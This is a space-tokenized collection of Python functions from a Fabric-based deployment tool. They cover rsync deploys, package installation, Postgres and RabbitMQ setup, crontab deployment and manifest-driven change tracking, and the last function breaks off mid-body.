def deploy_code ( self ) : assert self . genv . SITE , 'Site unspecified.' assert self . genv . ROLE , 'Role unspecified.' r = self . local_renderer if self . env . exclusions : r . env . exclusions_str = ' ' . join ( "--exclude='%s'" % _ for _ in self . env . exclusions ) r . local ( r . env . rsync_command ) r . sudo ( 'chown -R {rsync_chown_user}:{rsync_chown_group} {rsync_dst_dir}' )
def init_env ( ) : env . ROLES_DIR = ROLE_DIR env . services = [ ] env . confirm_deployment = False env . is_local = None env . base_config_dir = '.' env . src_dir = 'src' # The path relative to fab where the code resides. env . sites = { } # {site:site_settings} env [ SITE ] = None env [ ROLE ] = None env . hosts_retriever = None env . hosts_retrievers = type ( env ) ( ) #'default':lambda hostname: hostname, env . hostname_translator = 'default' env . hostname_translators = type ( env ) ( ) env . hostname_translators . default = lambda hostname : hostname env . default_site = None # A list of all site names that should be available on the current host. env . available_sites = [ ] # A list of all site names per host. # {hostname: [sites]} # If no entry found, will use available_sites. env . available_sites_by_host = { } # The command run to determine the percent of disk usage. env . disk_usage_command = "df -H | grep -vE '^Filesystem|tmpfs|cdrom|none' | awk '{print $5 " " $1}'" env . burlap_data_dir = '.burlap' env . setdefault ( 'roledefs' , { } ) env . setdefault ( 'roles' , [ ] ) env . setdefault ( 'hosts' , [ ] ) env . setdefault ( 'exclude_hosts' , [ ] )
def create_module ( name , code = None ) : if name not in sys . modules : sys . modules [ name ] = imp . new_module ( name ) module = sys . modules [ name ] if code : print ( 'executing code for %s: %s' % ( name , code ) ) exec ( code in module . __dict__ ) # pylint: disable=exec-used exec ( "from %s import %s" % ( name , '*' ) ) # pylint: disable=exec-used return module
def str_to_list ( s ) : if s is None : return [ ] elif isinstance ( s , ( tuple , list ) ) : return s elif not isinstance ( s , six . string_types ) : raise NotImplementedError ( 'Unknown type: %s' % type ( s ) ) return [ _ . strip ( ) . lower ( ) for _ in ( s or '' ) . split ( ',' ) if _ . strip ( ) ]
def get_hosts_retriever ( s = None ) : s = s or env . hosts_retriever #     #assert s, 'No hosts retriever specified.' if not s : return env_hosts_retriever #     module_name = '.'.join(s.split('.')[:-1]) #     func_name = s.split('.')[-1] #     retriever = getattr(importlib.import_module(module_name), func_name) #     return retriever return str_to_callable ( s ) or env_hosts_retriever
def write_temp_file_or_dryrun ( content , * args , * * kwargs ) : dryrun = get_dryrun ( kwargs . get ( 'dryrun' ) ) if dryrun : fd , tmp_fn = tempfile . mkstemp ( ) os . remove ( tmp_fn ) cmd_run = 'local' cmd = 'cat <<EOT >> %s\n%s\nEOT' % ( tmp_fn , content ) if BURLAP_COMMAND_PREFIX : print ( '%s %s: %s' % ( render_command_prefix ( ) , cmd_run , cmd ) ) else : print ( cmd ) else : fd , tmp_fn = tempfile . mkstemp ( ) fout = open ( tmp_fn , 'w' ) fout . write ( content ) fout . close ( ) return tmp_fn
def reboot_or_dryrun ( * args , * * kwargs ) : from fabric . state import connections verbose = get_verbose ( ) dryrun = get_dryrun ( kwargs . get ( 'dryrun' ) ) # Use 'wait' as max total wait time kwargs . setdefault ( 'wait' , 120 ) wait = int ( kwargs [ 'wait' ] ) command = kwargs . get ( 'command' , 'reboot' ) now = int ( kwargs . get ( 'now' , 0 ) ) print ( 'now:' , now ) if now : command += ' now' # Shorter timeout for a more granular cycle than the default. timeout = int ( kwargs . get ( 'timeout' , 30 ) ) reconnect_hostname = kwargs . pop ( 'new_hostname' , env . host_string ) if 'dryrun' in kwargs : del kwargs [ 'dryrun' ] if dryrun : print ( '%s sudo: %s' % ( render_command_prefix ( ) , command ) ) else : if is_local ( ) : if raw_input ( 'reboot localhost now? ' ) . strip ( ) [ 0 ] . lower ( ) != 'y' : return attempts = int ( round ( float ( wait ) / float ( timeout ) ) ) # Don't bleed settings, since this is supposed to be self-contained. # User adaptations will probably want to drop the "with settings()" and # just have globally set timeout/attempts values. with settings ( warn_only = True ) : _sudo ( command ) env . host_string = reconnect_hostname success = False for attempt in xrange ( attempts ) : # Try to make sure we don't slip in before pre-reboot lockdown if verbose : print ( 'Waiting for %s seconds, wait %i of %i' % ( timeout , attempt + 1 , attempts ) ) time . sleep ( timeout ) # This is actually an internal-ish API call, but users can simply drop # it in real fabfile use -- the next run/sudo/put/get/etc call will # automatically trigger a reconnect. # We use it here to force the reconnect while this function is still in # control and has the above timeout settings enabled. try : if verbose : print ( 'Reconnecting to:' , env . host_string ) # This will fail until the network interface comes back up. connections . connect ( env . host_string ) # This will also fail until SSH is running again. with settings ( timeout = timeout ) : _run ( 'echo hello' ) success = True break except Exception as e : print ( 'Exception:' , e ) if not success : raise Exception ( 'Reboot failed or took longer than %s seconds.' % wait )
def get_last_modified_timestamp ( path , ignore = None ) : ignore = ignore or [ ] if not isinstance ( path , six . string_types ) : return ignore_str = '' if ignore : assert isinstance ( ignore , ( tuple , list ) ) ignore_str = ' ' . join ( "! -name '%s'" % _ for _ in ignore ) cmd = 'find "' + path + '" ' + ignore_str + ' -type f -printf "%T@ %p\n" | sort -n | tail -1 | cut -f 1 -d " "' #'find '+path+' -type f -printf "%T@ %p\n" | sort -n | tail -1 | cut -d " " -f1 ret = subprocess . check_output ( cmd , shell = True ) # Note, we round now to avoid rounding errors later on where some formatters # use different decimal contexts. try : ret = round ( float ( ret ) , 2 ) except ValueError : return return ret
def get_packager ( ) : # TODO: remove once fabric stops using contextlib.nested. import warnings warnings . filterwarnings ( "ignore" , category = DeprecationWarning ) common_packager = get_rc ( 'common_packager' ) if common_packager : return common_packager #TODO:cache result by current env.host_string so we can handle multiple hosts with different OSes with settings ( warn_only = True ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : ret = _run ( 'cat /etc/fedora-release' ) if ret . succeeded : common_packager = YUM else : ret = _run ( 'cat /etc/lsb-release' ) if ret . succeeded : common_packager = APT else : for pn in PACKAGERS : ret = _run ( 'which %s' % pn ) if ret . succeeded : common_packager = pn break if not common_packager : raise Exception ( 'Unable to determine packager.' ) set_rc ( 'common_packager' , common_packager ) return common_packager
def get_os_version ( ) : # TODO: remove once fabric stops using contextlib.nested. import warnings warnings . filterwarnings ( "ignore" , category = DeprecationWarning ) common_os_version = get_rc ( 'common_os_version' ) if common_os_version : return common_os_version with settings ( warn_only = True ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : ret = _run_or_local ( 'cat /etc/lsb-release' ) if ret . succeeded : return OS ( type = LINUX , distro = UBUNTU , release = re . findall ( r'DISTRIB_RELEASE=([0-9\.]+)' , ret ) [ 0 ] ) ret = _run_or_local ( 'cat /etc/debian_version' ) if ret . succeeded : return OS ( type = LINUX , distro = DEBIAN , release = re . findall ( r'([0-9\.]+)' , ret ) [ 0 ] ) ret = _run_or_local ( 'cat /etc/fedora-release' ) if ret . succeeded : return OS ( type = LINUX , distro = FEDORA , release = re . findall ( r'release ([0-9]+)' , ret ) [ 0 ] ) raise Exception ( 'Unable to determine OS version.' )
def render_to_string ( template , extra = None ) : from jinja2 import Template extra = extra or { } final_fqfn = find_template ( template ) assert final_fqfn , 'Template not found: %s' % template template_content = open ( final_fqfn , 'r' ) . read ( ) t = Template ( template_content ) if extra : context = env . copy ( ) context . update ( extra ) else : context = env rendered_content = t . render ( * * context ) rendered_content = rendered_content . replace ( '&quot;' , '"' ) return rendered_content
def iter_sites ( sites = None , site = None , renderer = None , setter = None , no_secure = False , verbose = None ) : if verbose is None : verbose = get_verbose ( ) hostname = get_current_hostname ( ) target_sites = env . available_sites_by_host . get ( hostname , None ) if sites is None : site = site or env . SITE or ALL if site == ALL : sites = list ( six . iteritems ( env . sites ) ) else : sys . stderr . flush ( ) sites = [ ( site , env . sites . get ( site ) ) ] renderer = renderer #or render_remote_paths env_default = save_env ( ) for _site , site_data in sorted ( sites ) : if no_secure and _site . endswith ( '_secure' ) : continue # Only load site configurations that are allowed for this host. if target_sites is None : pass else : assert isinstance ( target_sites , ( tuple , list ) ) if _site not in target_sites : if verbose : print ( 'Skipping site %s because not in among target sites.' % _site ) continue env . update ( env_default ) env . update ( env . sites . get ( _site , { } ) ) env . SITE = _site if callable ( renderer ) : renderer ( ) if setter : setter ( _site ) yield _site , site_data # Revert modified keys. env . update ( env_default ) # Remove keys that were added, not simply updated. added_keys = set ( env ) . difference ( env_default ) for key in added_keys : # Don't remove internally maintained variables, because these are used to cache hostnames # used by iter_sites(). if key . startswith ( '_' ) : continue del env [ key ]
def get_hosts_for_site ( site = None ) : site = site or env . SITE hosts = set ( ) for hostname , _sites in six . iteritems ( env . available_sites_by_host ) : #         print('checking hostname:',hostname, _sites) for _site in _sites : if _site == site : #                 print( '_site:',_site) host_ip = get_host_ip ( hostname ) #                 print( 'host_ip:',host_ip) if host_ip : hosts . add ( host_ip ) break return list ( hosts )
def collect_genv ( self , include_local = True , include_global = True ) : e = type ( self . genv ) ( ) if include_global : e . update ( self . genv ) if include_local : for k , v in self . lenv . items ( ) : e [ '%s_%s' % ( self . obj . name . lower ( ) , k ) ] = v return e
def capture_bash ( self ) : class Capture ( object ) : def __init__ ( self , satchel ) : self . satchel = satchel self . _dryrun = self . satchel . dryrun self . satchel . dryrun = 1 begincap ( ) self . _stdout = sys . stdout self . _stderr = sys . stderr self . stdout = sys . stdout = StringIO ( ) self . stderr = sys . stderr = StringIO ( ) def __enter__ ( self ) : return self def __exit__ ( self , type , value , traceback ) : # pylint: disable=redefined-builtin endcap ( ) self . satchel . dryrun = self . _dryrun sys . stdout = self . _stdout sys . stderr = self . _stderr return Capture ( self )
def register ( self ) : self . _set_defaults ( ) all_satchels [ self . name . upper ( ) ] = self manifest_recorder [ self . name ] = self . record_manifest # Register service commands. if self . required_system_packages : required_system_packages [ self . name . upper ( ) ] = self . required_system_packages
def unregister ( self ) : for k in list ( env . keys ( ) ) : if k . startswith ( self . env_prefix ) : del env [ k ] try : del all_satchels [ self . name . upper ( ) ] except KeyError : pass try : del manifest_recorder [ self . name ] except KeyError : pass try : del manifest_deployers [ self . name . upper ( ) ] except KeyError : pass try : del manifest_deployers_befores [ self . name . upper ( ) ] except KeyError : pass try : del required_system_packages [ self . name . upper ( ) ] except KeyError : pass
def get_tasks ( self ) : tasks = set ( self . tasks ) #DEPRECATED for _name in dir ( self ) : # Skip properties so we don't accidentally execute any methods. if isinstance ( getattr ( type ( self ) , _name , None ) , property ) : continue attr = getattr ( self , _name ) if hasattr ( attr , '__call__' ) and getattr ( attr , 'is_task' , False ) : tasks . add ( _name ) return sorted ( tasks )
def local_renderer ( self ) : if not self . _local_renderer : r = self . create_local_renderer ( ) self . _local_renderer = r return self . _local_renderer
def all_other_enabled_satchels ( self ) : return dict ( ( name , satchel ) for name , satchel in self . all_satchels . items ( ) if name != self . name . upper ( ) and name . lower ( ) in map ( str . lower , self . genv . services ) )
def lenv ( self ) : _env = type ( env ) ( ) for _k , _v in six . iteritems ( env ) : if _k . startswith ( self . name + '_' ) : _env [ _k [ len ( self . name ) + 1 : ] ] = _v return _env
def param_changed_to ( self , key , to_value , from_value = None ) : last_value = getattr ( self . last_manifest , key ) current_value = self . current_manifest . get ( key ) if from_value is not None : return last_value == from_value and current_value == to_value return last_value != to_value and current_value == to_value
def reboot_or_dryrun ( self , * args , * * kwargs ) : warnings . warn ( 'Use self.run() instead.' , DeprecationWarning , stacklevel = 2 ) self . reboot ( * args , * * kwargs )
def set_site_specifics ( self , site ) : r = self . local_renderer site_data = self . genv . sites [ site ] . copy ( ) r . env . site = site if self . verbose : print ( 'set_site_specifics.data:' ) pprint ( site_data , indent = 4 ) # Remove local namespace settings from the global namespace # by converting <satchel_name>_<variable_name> to <variable_name>. local_ns = { } for k , v in list ( site_data . items ( ) ) : if k . startswith ( self . name + '_' ) : _k = k [ len ( self . name + '_' ) : ] local_ns [ _k ] = v del site_data [ k ] r . env . update ( local_ns ) r . env . update ( site_data )
def get_package_list ( self ) : os_version = self . os_version # OS(type=LINUX, distro=UBUNTU, release='14.04') self . vprint ( 'os_version:' , os_version ) # Lookup legacy package list. # OS: [package1, package2, ...], req_packages1 = self . required_system_packages if req_packages1 : deprecation ( 'The required_system_packages attribute is deprecated, ' 'use the packager_system_packages property instead.' ) # Lookup new package list. # OS: [package1, package2, ...], req_packages2 = self . packager_system_packages patterns = [ ( os_version . type , os_version . distro , os_version . release ) , ( os_version . distro , os_version . release ) , ( os_version . type , os_version . distro ) , ( os_version . distro , ) , os_version . distro , ] self . vprint ( 'req_packages1:' , req_packages1 ) self . vprint ( 'req_packages2:' , req_packages2 ) package_list = None found = False for pattern in patterns : self . vprint ( 'pattern:' , pattern ) for req_packages in ( req_packages1 , req_packages2 ) : if pattern in req_packages : package_list = req_packages [ pattern ] found = True break if not found : print ( 'Warning: No operating system pattern found for %s' % ( os_version , ) ) self . vprint ( 'package_list:' , package_list ) return package_list
def record_manifest ( self ) : manifest = get_component_settings ( prefixes = [ self . name ] ) # Record a signature of each template so we know to redeploy when they change. for template in self . get_templates ( ) : # Dereference brace notation. e.g. convert '{var}' to `env[var]`. if template and template . startswith ( '{' ) and template . endswith ( '}' ) : template = self . env [ template [ 1 : - 1 ] ] if not template : continue if template . startswith ( '%s/' % self . name ) : fqfn = self . find_template ( template ) else : fqfn = self . find_template ( '%s/%s' % ( self . name , template ) ) assert fqfn , 'Unable to find template: %s/%s' % ( self . name , template ) manifest [ '_%s' % template ] = get_file_hash ( fqfn ) for tracker in self . get_trackers ( ) : manifest [ '_tracker_%s' % tracker . get_natural_key_hash ( ) ] = tracker . get_thumbprint ( ) if self . verbose : pprint ( manifest , indent = 4 ) return manifest
def has_changes ( self ) : lm = self . last_manifest for tracker in self . get_trackers ( ) : last_thumbprint = lm [ '_tracker_%s' % tracker . get_natural_key_hash ( ) ] if tracker . is_changed ( last_thumbprint ) : return True return False
def configure ( self ) : lm = self . last_manifest for tracker in self . get_trackers ( ) : self . vprint ( 'Checking tracker:' , tracker ) last_thumbprint = lm [ '_tracker_%s' % tracker . get_natural_key_hash ( ) ] self . vprint ( 'last thumbprint:' , last_thumbprint ) has_changed = tracker . is_changed ( last_thumbprint ) self . vprint ( 'Tracker changed:' , has_changed ) if has_changed : self . vprint ( 'Change detected!' ) tracker . act ( )
def user_exists ( name ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : res = _run_as_pg ( '''psql -t -A -c "SELECT COUNT(*) FROM pg_user WHERE usename = '%(name)s';"''' % locals ( ) ) return ( res == "1" )
def write_pgpass ( self , name = None , site = None , use_sudo = 0 , root = 0 ) : r = self . database_renderer ( name = name , site = site ) root = int ( root ) use_sudo = int ( use_sudo ) r . run ( 'touch {pgpass_path}' ) if '~' in r . env . pgpass_path : r . run ( 'chmod {pgpass_chmod} {pgpass_path}' ) else : r . sudo ( 'chmod {pgpass_chmod} {pgpass_path}' ) if root : r . env . shell_username = r . env . get ( 'db_root_username' , 'postgres' ) r . env . shell_password = r . env . get ( 'db_root_password' , 'password' ) else : r . env . shell_username = r . env . db_user r . env . shell_password = r . env . db_password r . append ( '{db_host}:{port}:*:{shell_username}:{shell_password}' , r . env . pgpass_path , use_sudo = use_sudo )
def exists ( self , name = 'default' , site = None , use_root = False ) : r = self . database_renderer ( name = name , site = site ) if int ( use_root ) : kwargs = dict ( db_user = r . env . get ( 'db_root_username' , 'postgres' ) , db_password = r . env . get ( 'db_root_password' , 'password' ) , db_host = r . env . db_host , db_name = r . env . db_name , ) r . env . update ( kwargs ) # Set pgpass file. if r . env . db_password : self . write_pgpass ( name = name , root = use_root ) #        cmd = ('psql --username={db_user} --no-password -l '\ #            '--host={db_host} --dbname={db_name}'\ #            '| grep {db_name} | wc -l').format(**env) ret = None with settings ( warn_only = True ) : ret = r . run ( 'psql --username={db_user} --host={db_host} -l ' '| grep {db_name} | wc -l' ) if ret is not None : if 'password authentication failed' in ret : ret = False else : ret = int ( ret ) >= 1 if ret is not None : print ( '%s database on site %s %s exist' % ( name , self . genv . SITE , 'DOES' if ret else 'DOES NOT' ) ) return ret
def load_table ( self , table_name , src , dst = 'localhost' , name = None , site = None ) : #TODO: incomplete r = self . database_renderer ( name = name , site = site ) r . env . table_name = table_name r . run ( 'psql --user={dst_db_user} --host={dst_db_host} --command="DROP TABLE IF EXISTS {table_name} CASCADE;"' ) r . run ( 'pg_dump -t {table_name} --user={dst_db_user} --host={dst_db_host} | psql --user={src_db_user} --host={src_db_host}' )
def interfaces ( ) : with settings ( hide ( 'running' , 'stdout' ) ) : if is_file ( '/usr/sbin/dladm' ) : res = run ( '/usr/sbin/dladm show-link' ) else : res = sudo ( '/sbin/ifconfig -s' ) return [ line . split ( ' ' ) [ 0 ] for line in res . splitlines ( ) [ 1 : ] ]
def record_manifest ( self ) : data = { } data [ 'required_packages' ] = self . install_required ( type = SYSTEM , verbose = False , list_only = True ) data [ 'required_packages' ] . sort ( ) data [ 'custom_packages' ] = self . install_custom ( list_only = True ) data [ 'custom_packages' ] . sort ( ) data [ 'repositories' ] = self . get_repositories ( ) return data
def update ( self ) : packager = self . packager if packager == APT : self . sudo ( 'DEBIAN_FRONTEND=noninteractive apt-get -yq update' ) elif packager == YUM : self . sudo ( 'yum update' ) else : raise Exception ( 'Unknown packager: %s' % ( packager , ) )
def install_apt ( self , fn = None , package_name = None , update = 0 , list_only = 0 ) : r = self . local_renderer assert self . genv [ ROLE ] apt_req_fqfn = fn or ( self . env . apt_requirments_fn and self . find_template ( self . env . apt_requirments_fn ) ) if not apt_req_fqfn : return [ ] assert os . path . isfile ( apt_req_fqfn ) lines = list ( self . env . apt_packages or [ ] ) for _ in open ( apt_req_fqfn ) . readlines ( ) : if _ . strip ( ) and not _ . strip ( ) . startswith ( '#' ) and ( not package_name or _ . strip ( ) == package_name ) : lines . extend ( _pkg . strip ( ) for _pkg in _ . split ( ' ' ) if _pkg . strip ( ) ) if list_only : return lines tmp_fn = r . write_temp_file ( '\n' . join ( lines ) ) apt_req_fqfn = tmp_fn if not self . genv . is_local : r . put ( local_path = tmp_fn , remote_path = tmp_fn ) apt_req_fqfn = self . genv . put_remote_path r . sudo ( 'DEBIAN_FRONTEND=noninteractive apt-get -yq update --fix-missing' ) r . sudo ( 'DEBIAN_FRONTEND=noninteractive apt-get -yq install `cat "%s" | tr "\\n" " "`' % apt_req_fqfn )
def install_yum ( self , fn = None , package_name = None , update = 0 , list_only = 0 ) : assert self . genv [ ROLE ] yum_req_fn = fn or self . find_template ( self . genv . yum_requirments_fn ) if not yum_req_fn : return [ ] assert os . path . isfile ( yum_req_fn ) update = int ( update ) if list_only : return [ _ . strip ( ) for _ in open ( yum_req_fn ) . readlines ( ) if _ . strip ( ) and not _ . strip . startswith ( '#' ) and ( not package_name or _ . strip ( ) == package_name ) ] if update : self . sudo_or_dryrun ( 'yum update --assumeyes' ) if package_name : self . sudo_or_dryrun ( 'yum install --assumeyes %s' % package_name ) else : if self . genv . is_local : self . put_or_dryrun ( local_path = yum_req_fn ) yum_req_fn = self . genv . put_remote_fn self . sudo_or_dryrun ( 'yum install --assumeyes $(cat %(yum_req_fn)s)' % yum_req_fn )
def install_required ( self , type = None , service = None , list_only = 0 , * * kwargs ) : # pylint: disable=redefined-builtin r = self . local_renderer list_only = int ( list_only ) type = ( type or '' ) . lower ( ) . strip ( ) assert not type or type in PACKAGE_TYPES , 'Unknown package type: %s' % ( type , ) lst = [ ] if type : types = [ type ] else : types = PACKAGE_TYPES for _type in types : if _type == SYSTEM : content = '\n' . join ( self . list_required ( type = _type , service = service ) ) if list_only : lst . extend ( _ for _ in content . split ( '\n' ) if _ . strip ( ) ) if self . verbose : print ( 'content:' , content ) break fd , fn = tempfile . mkstemp ( ) fout = open ( fn , 'w' ) fout . write ( content ) fout . close ( ) self . install_custom ( fn = fn ) else : raise NotImplementedError return lst
def uninstall_blacklisted ( self ) : from burlap . system import distrib_family blacklisted_packages = self . env . blacklisted_packages if not blacklisted_packages : print ( 'No blacklisted packages.' ) return else : family = distrib_family ( ) if family == DEBIAN : self . sudo ( 'DEBIAN_FRONTEND=noninteractive apt-get -yq purge %s' % ' ' . join ( blacklisted_packages ) ) else : raise NotImplementedError ( 'Unknown family: %s' % family )
def deploy ( self , site = None ) : r = self . local_renderer self . deploy_logrotate ( ) cron_crontabs = [ ] #         if self.verbose: #             print('hostname: "%s"' % (hostname,), file=sys.stderr) for _site , site_data in self . iter_sites ( site = site ) : r . env . cron_stdout_log = r . format ( r . env . stdout_log_template ) r . env . cron_stderr_log = r . format ( r . env . stderr_log_template ) r . sudo ( 'touch {cron_stdout_log}' ) r . sudo ( 'touch {cron_stderr_log}' ) r . sudo ( 'sudo chown {user}:{user} {cron_stdout_log}' ) r . sudo ( 'sudo chown {user}:{user} {cron_stderr_log}' ) if self . verbose : print ( 'site:' , site , file = sys . stderr ) print ( 'env.crontabs_selected:' , self . env . crontabs_selected , file = sys . stderr ) for selected_crontab in self . env . crontabs_selected : lines = self . env . crontabs_available . get ( selected_crontab , [ ] ) if self . verbose : print ( 'lines:' , lines , file = sys . stderr ) for line in lines : cron_crontabs . append ( r . format ( line ) ) if not cron_crontabs : return cron_crontabs = self . env . crontab_headers + cron_crontabs cron_crontabs . append ( '\n' ) r . env . crontabs_rendered = '\n' . join ( cron_crontabs ) fn = self . write_to_file ( content = r . env . crontabs_rendered ) print ( 'fn:' , fn ) r . env . put_remote_path = r . put ( local_path = fn ) if isinstance ( r . env . put_remote_path , ( tuple , list ) ) : r . env . put_remote_path = r . env . put_remote_path [ 0 ] r . sudo ( 'crontab -u {cron_user} {put_remote_path}' )
def _configure_users ( self , site = None , full = 0 , only_data = 0 ) : site = site or ALL full = int ( full ) if full and not only_data : packager = self . get_satchel ( 'packager' ) packager . install_required ( type = SYSTEM , service = self . name ) r = self . local_renderer params = self . get_user_vhosts ( site = site ) # [(user, password, vhost)] with settings ( warn_only = True ) : self . add_admin_user ( ) params = sorted ( list ( params ) ) if not only_data : for user , password , vhost in params : r . env . broker_user = user r . env . broker_password = password r . env . broker_vhost = vhost with settings ( warn_only = True ) : r . sudo ( 'rabbitmqctl add_user {broker_user} {broker_password}' ) r . sudo ( 'rabbitmqctl add_vhost {broker_vhost}' ) r . sudo ( 'rabbitmqctl set_permissions -p {broker_vhost} {broker_user} ".*" ".*" ".*"' ) r . sudo ( 'rabbitmqctl set_permissions -p {broker_vhost} {admin_username} ".*" ".*" ".*"' ) return params
def record_manifest ( self ) : data = super ( RabbitMQSatchel , self ) . record_manifest ( ) params = sorted ( list ( self . get_user_vhosts ( ) ) ) # [(user, password, vhost)] data [ 'rabbitmq_all_site_vhosts' ] = params data [ 'sites' ] = list ( self . genv . sites or [ ] ) return data
def iter_dict_differences ( a , b ) : common_keys = set ( a ) . union ( b ) for k in common_keys : a_value = a . get ( k ) b_value = b . get ( k ) if a_value != b_value : yield k , ( a_value , b_value )
def get_component_order ( component_names ) : assert isinstance ( component_names , ( tuple , list ) ) component_dependences = { } for _name in component_names : deps = set ( manifest_deployers_befores . get ( _name , [ ] ) ) deps = deps . intersection ( component_names ) component_dependences [ _name ] = deps component_order = list ( topological_sort ( component_dependences . items ( ) ) ) return component_order
def get_deploy_funcs ( components , current_thumbprint , previous_thumbprint , preview = False ) : for component in components : funcs = manifest_deployers . get ( component , [ ] ) for func_name in funcs : #TODO:remove this after burlap.* naming prefix bug fixed if func_name . startswith ( 'burlap.' ) : print ( 'skipping %s' % func_name ) continue takes_diff = manifest_deployers_takes_diff . get ( func_name , False ) func = resolve_deployer ( func_name ) current = current_thumbprint . get ( component ) last = previous_thumbprint . get ( component ) if takes_diff : yield func_name , partial ( func , last = last , current = current ) else : yield func_name , partial ( func )
def manifest_filename ( self ) : r = self . local_renderer tp_fn = r . format ( r . env . data_dir + '/manifest.yaml' ) return tp_fn
def lock ( self ) : self . init ( ) r = self . local_renderer if self . file_exists ( r . env . lockfile_path ) : raise exceptions . AbortDeployment ( 'Lock file %s exists. Perhaps another deployment is currently underway?' % r . env . lockfile_path ) else : self . vprint ( 'Locking %s.' % r . env . lockfile_path ) r . env . hostname = socket . gethostname ( ) r . run_or_local ( 'echo "{hostname}" > {lockfile_path}' )
def unlock ( self ) : self . init ( ) r = self . local_renderer if self . file_exists ( r . env . lockfile_path ) : self . vprint ( 'Unlocking %s.' % r . env . lockfile_path ) r . run_or_local ( 'rm -f {lockfile_path}' )
def get_component_funcs ( self , components = None ) : current_tp = self . get_current_thumbprint ( components = components ) or { } previous_tp = self . get_previous_thumbprint ( components = components ) or { } if self . verbose : print ( 'Current thumbprint:' ) pprint ( current_tp , indent = 4 ) print ( 'Previous thumbprint:' ) pprint ( previous_tp , indent = 4 ) differences = list ( iter_dict_differences ( current_tp , previous_tp ) ) if self . verbose : print ( 'Differences:' ) pprint ( differences , indent = 4 ) component_order = get_component_order ( [ k for k , ( _ , _ ) in differences ] ) if self . verbose : print ( 'component_order:' ) pprint ( component_order , indent = 4 ) plan_funcs = list ( get_deploy_funcs ( component_order , current_tp , previous_tp ) ) return component_order , plan_funcs
def preview ( self , components = None , ask = 0 ) : ask = int ( ask ) self . init ( ) component_order , plan_funcs = self . get_component_funcs ( components = components ) print ( '\n%i changes found for host %s.\n' % ( len ( component_order ) , self . genv . host_string ) ) if component_order and plan_funcs : if self . verbose : print ( 'These components have changed:\n' ) for component in sorted ( component_order ) : print ( ( ' ' * 4 ) + component ) print ( 'Deployment plan for host %s:\n' % self . genv . host_string ) for func_name , _ in plan_funcs : print ( success_str ( ( ' ' * 4 ) + func_name ) ) if component_order : print ( ) if ask and self . genv . host_string == self . genv . hosts [ - 1 ] : if component_order : if not raw_input ( 'Begin deployment? [yn] ' ) . strip ( ) . lower ( ) . startswith ( 'y' ) : sys . exit ( 0 ) else : sys . exit ( 0 )
def push ( self , components = None , yes = 0 ) : from burlap import notifier service = self . get_satchel ( 'service' ) self . lock ( ) try : yes = int ( yes ) if not yes : # If we want to confirm the deployment with the user, and we're at the first server, # then run the preview. if self . genv . host_string == self . genv . hosts [ 0 ] : execute ( partial ( self . preview , components = components , ask = 1 ) ) notifier . notify_pre_deployment ( ) component_order , plan_funcs = self . get_component_funcs ( components = components ) service . pre_deploy ( ) for func_name , plan_func in plan_funcs : print ( 'Executing %s...' % func_name ) plan_func ( ) self . fake ( components = components ) service . post_deploy ( ) notifier . notify_post_deployment ( ) finally : self . unlock ( )
def get_thumbprint ( self ) : d = { } settings = dj . get_settings ( ) for name in self . names : d [ name ] = getattr ( settings , name ) return d
def get_settings ( self , site = None , role = None ) : r = self . local_renderer _stdout = sys . stdout _stderr = sys . stderr if not self . verbose : sys . stdout = StringIO ( ) sys . stderr = StringIO ( ) try : sys . path . insert ( 0 , r . env . src_dir ) # Temporarily override SITE. tmp_site = self . genv . SITE if site and site . endswith ( '_secure' ) : site = site [ : - 7 ] site = site or self . genv . SITE or self . genv . default_site self . set_site ( site ) # Temporarily override ROLE. tmp_role = self . genv . ROLE if role : self . set_role ( role ) try : # We need to explicitly delete sub-modules from sys.modules. Otherwise, reload() skips # them and they'll continue to contain obsolete settings. if r . env . delete_module_with_prefixes : for name in sorted ( sys . modules ) : for prefix in r . env . delete_module_with_prefixes : if name . startswith ( prefix ) : if self . verbose : print ( 'Deleting module %s prior to re-import.' % name ) del sys . modules [ name ] break for name in list ( sys . modules ) : for s in r . env . delete_module_containing : if s in name : del sys . modules [ name ] break if r . env . settings_module in sys . modules : del sys . modules [ r . env . settings_module ] #TODO:fix r.env.settings_module not loading from settings? #                 print('r.genv.django_settings_module:', r.genv.django_settings_module, file=_stdout) #                 print('r.genv.dj_settings_module:', r.genv.dj_settings_module, file=_stdout) #                 print('r.env.settings_module:', r.env.settings_module, file=_stdout) if 'django_settings_module' in r . genv : r . env . settings_module = r . genv . django_settings_module else : r . env . settings_module = r . env . settings_module or r . genv . dj_settings_module if self . verbose : print ( 'r.env.settings_module:' , r . env . settings_module , r . format ( r . env . settings_module ) ) module = import_module ( r . format ( r . env . settings_module ) ) if site : assert site == module . SITE , 'Unable to set SITE to "%s" Instead it is set to "%s".' % ( site , module . SITE ) # Works as long as settings.py doesn't also reload anything. import imp imp . reload ( module ) except ImportError as e : print ( 'Warning: Could not import settings for site "%s": %s' % ( site , e ) , file = _stdout ) traceback . print_exc ( file = _stdout ) #raise # breaks *_secure pseudo sites return finally : if tmp_site : self . set_site ( tmp_site ) if tmp_role : self . set_role ( tmp_role ) finally : sys . stdout = _stdout sys . stderr = _stderr sys . path . remove ( r . env . src_dir ) return module
def install_sql ( self , site = None , database = 'default' , apps = None , stop_on_error = 0 , fn = None ) : #from burlap.db import load_db_set stop_on_error = int ( stop_on_error ) site = site or ALL name = database r = self . local_renderer paths = glob . glob ( r . format ( r . env . install_sql_path_template ) ) apps = [ _ for _ in ( apps or '' ) . split ( ',' ) if _ . strip ( ) ] if self . verbose : print ( 'install_sql.apps:' , apps ) def cmp_paths ( d0 , d1 ) : if d0 [ 1 ] and d0 [ 1 ] in d1 [ 2 ] : return - 1 if d1 [ 1 ] and d1 [ 1 ] in d0 [ 2 ] : return + 1 return cmp ( d0 [ 0 ] , d1 [ 0 ] ) def get_paths ( t ) : data = [ ] # [(path, view_name, content)] for path in paths : if fn and fn not in path : continue parts = path . split ( '.' ) if len ( parts ) == 3 and parts [ 1 ] != t : continue if not path . lower ( ) . endswith ( '.sql' ) : continue content = open ( path , 'r' ) . read ( ) matches = re . findall ( r'[\s\t]+VIEW[\s\t]+([a-zA-Z0-9_]{3,})' , content , flags = re . IGNORECASE ) view_name = '' if matches : view_name = matches [ 0 ] print ( 'Found view %s.' % view_name ) data . append ( ( path , view_name , content ) ) for d in sorted ( data , cmp = cmp_paths ) : yield d [ 0 ] def run_paths ( paths , cmd_template , max_retries = 3 ) : r = self . local_renderer paths = list ( paths ) error_counts = defaultdict ( int ) # {path:count} terminal = set ( ) if self 